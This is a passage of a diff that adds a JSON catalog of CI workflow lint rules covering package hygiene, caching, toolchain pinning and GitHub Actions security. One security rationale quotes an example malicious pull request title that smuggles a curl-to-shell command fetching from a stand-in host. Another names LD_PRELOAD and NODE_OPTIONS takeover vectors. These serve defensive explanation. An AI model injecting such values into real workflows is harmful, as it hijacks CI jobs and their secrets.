+      "id": "packages/exports-map",
+      "metadataSha256": "392704693101f548c834ae8073c8b349720db905e0303b188f9c1af01264a9f5",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "Library packages should declare an `exports` map, and ESM libraries a `sideEffects` field."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "An `exports` map is the package's public API: it blocks deep imports into internals, so packages can be split, moved, and rebuilt independently without breaking consumers, and it lets bundlers and TypeScript resolve the right entry without probing. `sideEffects` tells bundlers which modules are safe to drop, which keeps tree-shaking effective and app bundles (and their build times) small."
+      },
+      "autofix": "not-provided",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "packages/files-allowlist",
+      "metadataSha256": "0c1416338e68d26bf6381dae5f86ab93c530e2e17b43081fd7b0ad62484ff851",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "Publishable packages should declare a `files` allowlist (or an `.npmignore`) so the tarball only ships build output."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "Without an allowlist `npm publish` packs the whole package directory: sources, tests, fixtures, configs, and stray build caches. Bloated tarballs make every install, CI cache restore, and container layer that contains node_modules larger and slower, and can leak files that were never meant to be published. A `files` allowlist keeps composable packages small."
+      },
+      "autofix": "not-provided",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "packages/monolith",
+      "metadataSha256": "7332bc783994d6ef89830b825d56b2c1b289cead33d707818f40a44cde4aad7e",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "Packages with very many dependencies are candidates for decomposition into smaller composable packages."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "A package that pulls in everything is one cache key: any change to it, or to any of its dependencies, reinstalls, rebuilds, and retests the whole thing, and every image that contains it ships all of it. Smaller packages with explicit boundaries let affected-only CI, remote caches, and OCI layers reuse work, which is what keeps agentic edit-test loops fast."
+      },
+      "autofix": "not-provided",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "packages/version-drift",
+      "metadataSha256": "496692f7adfa8b1b9dda706833930514b6eb72b24aaa97b1bbbf21855b6a79d4",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "Workspace packages should declare each third-party dependency with the same version specifier."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "When packages in one monorepo ask for different ranges of the same dependency, the lockfile carries several copies, installs and node_modules grow, Docker dependency layers and CI caches fragment by package, and packages behave differently at runtime and in tests. A single version policy keeps one hermetic dependency set that every package and image layer can share."
+      },
+      "autofix": "not-provided",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "redundancy/duplicate-command",
+      "metadataSha256": "e7ea779520225e2f2d031b8e28746c9e2753a0dd9eff66391449e497c4f307f5",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "Review repeated non-trivial shell commands for potentially redundant work."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "Repeated command text can indicate avoidable work, but identical text does not establish identical effects or cost: files, environment, tool caches and external state may have changed. Check conditions and intervening effects before removing an invocation, then measure any savings."
+      },
+      "autofix": "not-provided",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "redundancy/duplicate-setup-step",
+      "metadataSha256": "db751fc4ee334569867f82f6a41d0f72da0e26d8450fac9fef5d9f836110bdc3",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "Review repeated toolchain setup declarations with matching visible inputs."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "Repeated setup declarations may add avoidable work, but tool caches can avoid downloads and intervening steps can change the environment or toolchain. Matching visible inputs alone does not establish that the second setup is redundant. Verify conditions, outputs and environment requirements before removing it."
+      },
+      "autofix": "not-provided",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "redundancy/rebuild-per-job",
+      "metadataSha256": "067374fbe410f03afba66ddb3fea6c646a627e7d6785d5ce269b10ce80a9f781",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "Several jobs in a workflow should not each rebuild the same project from scratch."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "Repeated build commands may duplicate work, but matching visible commands and runner labels do not establish equivalent inputs or outputs. Where consumers can safely share a verified immutable artifact, building once may reduce repeated work and align their inputs. Artifact transfer, serialization and changed critical paths can offset the saving; validate semantics and measure the result."
+      },
+      "autofix": "not-provided",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "redundancy/repeated-job-setup",
+      "metadataSha256": "2259417589446a00fe065d21a5f1c95c2dc4acd857b1feccdda317f78c550c46",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "Jobs that repeat the same leading setup steps could share a composite action."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "When many jobs open with the same checkout, toolchain, and install steps, every change to that setup (a new cache key, an action upgrade, a registry login) has to be made in each copy. Copies drift, and drifted setup is a common source of 'works in one job, fails in another'. A local composite action keeps one definition."
+      },
+      "autofix": "not-provided",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "redundancy/shadowed-env",
+      "metadataSha256": "268e28d3d31ecc68960e2488a4d4cd13c70d0b3bccbfb07dad035f0f78911395",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "A job or step should not redefine an environment variable to the value it already inherits."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "Workflow-level `env` is inherited by every job and step. Repeating the same `KEY: value` lower down adds noise and creates a second copy that must be changed in lockstep; when only one copy is updated, the inner one silently wins."
+      },
+      "autofix": "not-formally-proved",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "redundancy/toolchain-version-drift",
+      "metadataSha256": "8df1ec7208b6386248e08af78fdb9499232d1ae773812ed60de8cdb11b76673d",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "Workflows should agree on the toolchain version they install with each setup action."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "When one workflow installs Node 20 and another Node 22, or Python 3.11 versus 3.12, CI validates on one runtime and releases on another. These pins are usually updated one file at a time, so they drift. A single version file read by every setup step keeps them aligned. This covers language toolchains installed by setup actions, not package dependency versions."
+      },
+      "autofix": "not-provided",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "registries/ghcr",
+      "metadataSha256": "5901f90f413668cae55a87e08be4a782b93dc043d623645a61514c623a1e506c",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "Container images built in CI should be published to GitHub Container Registry (ghcr.io)."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "Publishing to GHCR keeps images next to the code: the workflow's GITHUB_TOKEN can push without long-lived registry secrets, packages inherit organization permissions and link to the repository, and runners pull from GHCR without Docker Hub's anonymous rate limits. Shared base and dependency layers published once to GHCR can then be reused by every service in the monorepo."
+      },
+      "autofix": "not-provided",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "registries/github-npm",
+      "metadataSha256": "7b9be7867143022f2e769d773657c6710ee21d7b1e2fb7f4004add514a0e9916",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "Internal scoped npm packages should be published to the GitHub npm registry (npm.pkg.github.com)."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "Publishing internal packages to GitHub Packages keeps them next to their source: Actions publish and install with the workflow's GITHUB_TOKEN instead of long-lived npm tokens, access follows organization and repository permissions, and small composable packages can be versioned and consumed independently by every repository and container build in the organization."
+      },
+      "autofix": "not-provided",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "security/env-file-injection",
+      "metadataSha256": "899ea267e40bd9afadc98de79bfe72261ba22e6a42d5bf4694d13ac9040f81eb",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "Attacker-controlled values must not be written to `$GITHUB_ENV`, `$GITHUB_PATH`, or `$GITHUB_OUTPUT`."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "Lines written to `$GITHUB_ENV` become environment variables for every later step, and `$GITHUB_PATH` entries change which binaries run. A branch name or issue title containing a newline can append its own `NODE_OPTIONS=--require=...`, `LD_PRELOAD`, or `PATH` entry and take over subsequent steps, including ones holding secrets. Interpolated values written to `$GITHUB_OUTPUT` can likewise forge outputs consumed by later jobs."
+      },
+      "autofix": "not-provided",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "security/excessive-permissions",
+      "metadataSha256": "2563bfbcd427a65da7f0207da75e4a29b9eada31e37268be30e6fa45698103b1",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "Workflows should declare least-privilege `permissions:` for the `GITHUB_TOKEN`, and never grant `write-all` or write access to code and pull requests on untrusted triggers."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "Without a `permissions:` block the token gets the repository or organization default, which on older repositories is read/write to almost every scope. Any compromised dependency, action, or injected script inherits that access. Declaring the scopes each job needs limits the blast radius; on `pull_request_target`, `issue_comment`, and `workflow_run`, where outside contributors influence what runs, write access to contents lets an attacker push code, and write access to pull requests or issues in a job that also runs untrusted code or input lets them approve changes or spam the tracker."
+      },
+      "autofix": "not-provided",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "security/expression-injection",
+      "metadataSha256": "912defcadafb7c56aba301fd8e6a613572d189cfbd805481f4ceabe9338ff71a",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "Attacker-controlled `${{ }}` values (titles, bodies, branch names, commit messages) must not be interpolated directly into `run:` scripts or `github-script` code."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": 'Expressions are substituted into the script text before the shell or JavaScript runtime parses it, so a pull request title like `a"; curl evil.sh | sh; #` becomes code. The job then runs that code with its token and secrets. Passing the value through an environment variable makes it plain data that the script reads at run time.'
+      },
+      "autofix": "not-provided",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "security/install-scripts-privileged",
+      "metadataSha256": "c802f79226514eb8e921b1c2ccbd3ba491cf078b5959418584d304dd6f3a6117",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "Package installs in privileged workflows that hold secrets or a write token should pass `--ignore-scripts`."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "npm, yarn, and pnpm run `preinstall`/`install`/`postinstall` scripts from every dependency by default. In a job that triggers on `pull_request_target`, `workflow_run`, or `issue_comment` and also holds secrets or a writable token, a single compromised or attacker-controlled package can read those credentials during the install. Disabling lifecycle scripts, and running only the specific builds you need afterwards, keeps install-time code away from the credentials."
+      },
+      "autofix": "not-provided",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "security/mutable-remote-ref",
+      "metadataSha256": "92e1964aefc8155f2af3545c3f3aee55979375504bf8725dcfb1c3f24f8ca9fa",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "Tools installed straight from a git repository or `@latest` should be pinned to a commit SHA or release version."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "Installing from a branch (or a repository's default branch) runs whatever code that branch holds at the moment the job starts. A force-push, a compromised maintainer account, or a hijacked repository silently changes what CI executes, and the run cannot be reproduced later. Pinning to a full commit SHA or a released version makes the dependency immutable and reviewable."
+      },
+      "autofix": "not-provided",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "security/persisted-credentials",
+      "metadataSha256": "83edf545a7499aff3f2d2e1b194d49c6e57ae963a1d3f3fae2d73e4b2b008355",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "`actions/checkout` should set `persist-credentials: false` in jobs that upload the workspace or run pull request code with elevated privileges."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "By default `actions/checkout` writes the job's token into `.git/config` so later git commands can authenticate. Any later step can read it, and an artifact that includes the `.git` directory publishes it to anyone who can download the artifact. When the job does not push, disabling credential persistence removes the token from disk entirely."
+      },
+      "autofix": "not-formally-proved",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "security/privileged-cache-restore",
+      "metadataSha256": "896a51a24efea253bfbcb27bf90530b3d04372fcd50d86ac1989c24469180b49",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "Workflows triggered by `pull_request_target`, `workflow_run`, or `issue_comment` should not restore or save dependency caches."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "The Actions cache is shared across workflows on the same branch scope. A cache entry written by untrusted code (for example a pull request build on the default branch's scope, or a privileged job that ran contributor code) can be restored into a privileged job, which then executes the poisoned binaries with secrets and a write token. Privileged workflows should build from clean inputs."
+      },
+      "autofix": "not-provided",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "security/secrets-bulk-expose",
+      "metadataSha256": "daa3d29ffdea7f151b7623d9ca98c10b05d92a5c929f83a6ba3287d7448f205b",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "Workflows must not serialize the whole `secrets` context with `toJSON(secrets)` or print secrets with `echo`/`printf`."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "`toJSON(secrets)` hands every repository and organization secret to a single step, so one compromised action or script leaks all of them; it also defeats per-job least privilege. Printing a secret relies entirely on log masking, which misses transformed values (base64, substrings, JSON escapes) and leaves the value in step summaries or downstream tools. Pass only the specific secrets a step needs through `env:` and never write them to stdout."
+      },
+      "autofix": "not-provided",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "security/untrusted-checkout",
+      "metadataSha256": "020244a79c6b3391e3eb938c6facbffbffef1cc1c7ce0752122fbea1f41bf774",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "`pull_request_target` and `workflow_run` workflows must not check out the pull request's code and then execute it."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "These triggers run in the base repository's context with its secrets and a token that can write. Checking out the contributor's head commit and then running a build, test, script, or local action executes attacker-authored code with those privileges (a \"pwn request\"). Run untrusted code in a `pull_request` workflow instead, and hand results to the privileged workflow as data."
+      },
+      "autofix": "not-provided",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "testing/cache-disabled-install",
+      "metadataSha256": "ec5b54d4547245bf6a3c8606b7946869269aebb920c62dbf4f95b4d320ced39c",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "Review installs that appear to clear or bypass a configured package-manager cache."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "Clearing or bypassing compatible restored package-manager entries can cause avoidable work. Restore/save operations are conditional, and clearing a cache does not necessarily require a registry download. Verify actual cache paths, command ordering, install behavior and any correctness or isolation requirement before changing the workflow."
+      },
+      "autofix": "not-provided",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "testing/fixed-sleep",
+      "metadataSha256": "9441c829db209cf413b25955843a22b1c08fd8530697b8a73e43ed905400636b",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "Run steps should wait for services to become ready instead of sleeping for a fixed time."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "A fixed delay can outlast service startup or finish before the service is ready. A bounded readiness check can reduce unnecessary waiting and report timeout failures, but its health predicate, polling interval and timeout must match the workload. Preserve deliberate rate-limiting or propagation delays rather than assuming every sleep is redundant."
+      },
+      "autofix": "not-provided",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "testing/masked-failures",
+      "metadataSha256": "5dc155a5f9d7207da3437e29d37f7a468c0d751b5a8e3779f05cca35f1e81d22",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "Test failures should fail the job, not be silenced by `continue-on-error: true` or `|| true`."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "When a failing test step is allowed to pass, the check stays green, regressions merge unnoticed and the minutes spent running the tests buy no signal. Agents that iterate until CI is green are especially misled by a check that cannot fail."
+      },
+      "autofix": "not-provided",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "testing/playwright-browser-cache",
+      "metadataSha256": "1fc2072ef842b63679a59b889e35f3c5e6a8c227b1186039e450f74612d77025",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "Evaluate browser reuse when Playwright downloads are a measured bottleneck."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "`playwright install` may download missing browser builds; runner images or existing caches may already supply them. Restoring an archive can cost as much as downloading the browsers, and Linux OS dependencies still need installation. Inspect actual install/restore timings and version/platform compatibility before choosing a browser cache or matching Playwright image."
+      },
+      "autofix": "not-provided",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "testing/tool-incremental-cache",
+      "metadataSha256": "50bd7fefc29ed39dad06d73bf31de8747593bba817d64e27ab3b48dfe8495e19",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "ESLint, tsc and Jest should keep their incremental caches between CI runs."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "ESLint (`--cache`), TypeScript (`incremental`/`tsc -b`) and Jest (transform cache) can reuse compatible prior work. Fresh jobs may lack that state, but persistent runners and tool-managed caches can already provide it. Cache restoration, invalidation and upload costs can outweigh savings; measure repeat runs rather than assuming runtime becomes proportional to changed files."
+      },
+      "autofix": "not-provided",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "testing/unconditional-debug-upload",
+      "metadataSha256": "2de3be9321d1dc8e4104dd6be2eb00d3fffb718799f1018d6be3aa6c536d8467",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "Consider failure-only uploads for test artifacts used solely for debugging."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "A step's default success condition can skip a debugging upload after an earlier unhandled failure. When successful-run artifacts are not needed, `if: failure()` may avoid unnecessary transfers while retaining failure diagnostics. Visible conditions and consumers are only a heuristic: verify artifact consumers, continue-on-error behavior and diagnostic needs before changing the condition."
+      },
+      "autofix": "not-formally-proved",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "testing/watch-mode-in-ci",
+      "metadataSha256": "9327fbe1fbbbd7c3159758af9a533e55087f1b13541a0f8171340c72d78ab9b8",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "Test runners and compilers in CI should run once instead of in watch mode."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "A watcher never exits on its own: `jest --watch`, `vitest watch`, `karma start` or `ng test` without single-run keeps the job alive until the job timeout (six hours by default), burning runner minutes and blocking the merge signal."
+      },
+      "autofix": "not-provided",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "toolchains/bazel-missing-version-pin",
+      "metadataSha256": "c4bd5ff7d4621a7fc03ec270f22f83f08e9d802806851c7cc37e0507aaa5eaab",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "Bazel workspaces built in CI should pin the Bazel version in a checked-in `.bazelversion` file."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "Bazelisk resolves Bazel using its environment/configuration and version file. Without a visible choice, its fallback can track newer releases; floating labels intentionally do so. Plain Bazel does not select versions this way, so only explicit bazelisk commands or bazel commands after a recognized Bazelisk setup are considered. External configuration, cache state and installer versions can change resolution. An exact reviewed release constrains the tool version, not whole-build reproducibility."
+      },
+      "autofix": "not-provided",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "toolchains/go-mod-mutable-override",
+      "metadataSha256": "b6aa8d93e1870b916b3ba06f49b9fcbffb8318c512c1bc3abbd343cd9e0bd60f",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "CI should not let Go build commands rewrite go.mod and go.sum (`-mod=mod`, GOFLAGS, or a `go get` before building)."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "In modern module-aware Go builds, -mod=mod permits go.mod updates when module loading needs them. Since Go 1.16 the ordinary default is readonly unless automatic vendor mode or other configuration applies. Readonly restricts go.mod updates, not every go.sum write; go mod download may also update sums. These flags do not prove an actual graph change or absence of review. If both files must remain unchanged, verify their diff after all resolving commands."
+      },
+      "autofix": "not-provided",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "toolchains/gradle-build-cache-disabled",
+      "metadataSha256": "20a16f42726a2c7e50f725897ed30ee2815cde12c53df6902fe053141bf94332",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "Gradle builds run in CI should enable the build cache with `org.gradle.caching=true`."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "Gradle's build cache is opt-in. It can reuse eligible task outputs when matching cache entries are available; ordinary up-to-date checks and existing outputs can still avoid work without it. Reuse across ephemeral runners requires cache persistence or a remote cache. Custom tasks must declare their inputs correctly before caching is safe. This detector only sees repository configuration and workflow invocations, not user-home properties, external init scripts or runtime cache hits."
+      },
+      "autofix": "not-provided",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "toolchains/gradle-configuration-cache-disabled",
+      "metadataSha256": "a377733a1e1b6aa82894fb9d7d85f53275f1c98829f73fe12017d47f66fa7f13",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "Gradle 8.1+ builds run in CI could enable the configuration cache with `org.gradle.configuration-cache=true`."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "A compatible configuration-cache entry can avoid repeating configuration for matching tasks and inputs and allow more task concurrency. Entry availability, worker limits, task dependencies and plugin compatibility determine the benefit. The cache became stable in Gradle 8.1; this detector sees repository properties and explicit invocation options, not all user-home/init-script configuration. Validate isolation, secret handling and persistence before opting in."
+      },
+      "autofix": "not-provided",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "toolchains/gradle-parallel-disabled",
+      "metadataSha256": "621e8549b96c1414cea50c38064f21e1216067793138fb06742043fb62ef24c0",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "Multi-project Gradle builds run in CI could execute independent subprojects in parallel with `org.gradle.parallel=true`."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "Enabling parallel project execution can overlap independent subproject tasks, subject to task dependencies, worker limits and shared-resource constraints. Other concurrency, including worker APIs or configuration-cache task execution, may already exist. Source-level include declarations do not establish an independent runtime task graph. Measure representative builds and validate shared mutable state before changing scheduling."
+      },
+      "autofix": "not-provided",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "toolchains/python-pip-no-hash-check",
+      "metadataSha256": "e7e19da11cc67a56eb87e34af7a89dbc6c6db6130a6bd87d037f7788755c5acb",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "CI installs fully pinned requirements files with pip without hash-checking mode (`--hash` entries and `--require-hashes`)."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "A version pin does not identify a unique distribution archive. Hash-checking mode checks downloaded requirement artifacts against independently reviewed hashes, rather than relying only on hashes supplied by the index. Every requirement and transitive dependency needs a pin and hash. Multiple allowed wheels, platforms and source-build dependencies can still produce different environments: hash checking is an artifact-integrity control, not a proof of reproducible or hermetic builds. External pip configuration is not evaluated."
+      },
+      "autofix": "not-provided",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "toolchains/rust-cargo-incremental-in-ci",
+      "metadataSha256": "4f4cffbd31c1c064c3a0ecf9b379f6faf1a58e5c0d68228e2bbb1d90852623f9",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "Review incremental compilation tradeoffs in CI jobs that cache Cargo's `target/` directory."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "Incremental compilation writes session data that can help subsequent builds, including multiple compilations within the same CI job. Persisting it across runs may cost more than it saves; Swatinem/rust-cache removes it before saving. CARGO_INCREMENTAL=1 forces it on regardless of profile settings. Cargo 1.99 introduced a CI default of off, while older dev/test profiles default on absent overrides. Paths and cache behavior depend on toolchain/action versions. Benchmark before disabling incremental compilation; this is a tradeoff, not proof of wasted work."
+      },
+      "autofix": "not-provided",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "toolchains/rust-missing-locked-flag",
+      "metadataSha256": "f11ede022073cc3d949936710b7f217f8d5ee0db819b8133fe8b209473823224",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "Cargo commands in CI should pass `--locked` so the committed `Cargo.lock` is enforced instead of silently rewritten."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "Cargo normally reuses a compatible lockfile, but may resolve dependencies and rewrite it when manifests or configuration require a change. Absence of --locked is permission to change the lock, not evidence that it changes or that dependencies were unreviewed. --locked rejects a missing/changed lockfile; it does not prove a reproducible build or forbid network access. Apply this policy only where CI is intended to enforce a frozen dependency graph."
+      },
+      "autofix": "not-provided",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "toolchains/rust-toolchain-unpinned",
+      "metadataSha256": "914ce62e56d3141b28ceec1d00d1f4fc568a1e75cd4a9ca2523f5c3c1d74f3fd",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "CI should build Rust with a pinned toolchain release rather than the floating `stable`/`nightly` channel."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "Floating stable/beta/nightly selections can pick newer compiler and bundled-tool releases without a repository change. Deliberate compatibility jobs may want this. A reviewed version/date selection constrains the toolchain but does not prove reproducibility. Rust cache keys can incorporate compiler identity, while fallback/seeded entries may still provide reuse. Scoped toolchain files and explicit command/environment overrides take precedence according to rustup and installer behavior."
+      },
+      "autofix": "not-provided",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "toolchains/uv-sync-unlocked",
+      "metadataSha256": "ca9b2f2957339fbe3c12a3e4f0c87b518ac8980bd9147c56f8ca39de1d4afec4",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "`uv sync` and `uv run` in CI should pass `--locked` so the committed `uv.lock` is enforced instead of silently re-locked."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
+        "rationale": "Project-mode uv sync/run can update uv.lock when freshness checks require it; a compatible existing lock need not change. --locked rejects required lock changes, whereas --frozen skips freshness checks and --no-sync avoids synchronization. Environment equivalents depend on uv version and boolean values. This rule observes visible lock policy, not actual resolution, review history or whole-build reproducibility."
+      },
+      "autofix": "not-provided",
+      "engineContracts": [
+        "severity-last-assignment-wins"
+      ],
+      "optionalModelCertificates": []
+    },
+    {
+      "id": "triggers/draft-pr-gating",
+      "metadataSha256": "4bfc94a80d06096adeb127df2b10d3e76e3535ddbbf96331252929c2bd506bcd",
+      "detector": {
+        "assurance": "heuristic-not-formally-proved",
+        "claim": "Skip expensive pull request jobs while the pull request is still a draft."
+      },
+      "recommendation": {
+        "assurance": "conditional-not-universally-proved",
